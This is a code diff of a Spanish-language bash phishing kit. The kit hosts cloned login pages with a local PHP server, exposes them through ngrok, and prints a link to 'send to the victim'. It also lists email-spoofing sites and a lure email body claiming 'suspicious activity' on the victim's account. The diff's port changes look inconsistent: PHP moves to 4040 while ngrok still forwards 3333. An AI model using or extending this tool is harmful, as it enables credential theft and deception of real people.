@@ -392,7 +392,7 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
+default_port="3000" #$(seq 1111 4444 | sort -R | head -n1)
 printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escojer un puerto (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
@@ -449,7 +449,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor PHP...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:4040 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con Ngrok...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -459,8 +459,6 @@ link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngr
 printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en os siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
 printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
 printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
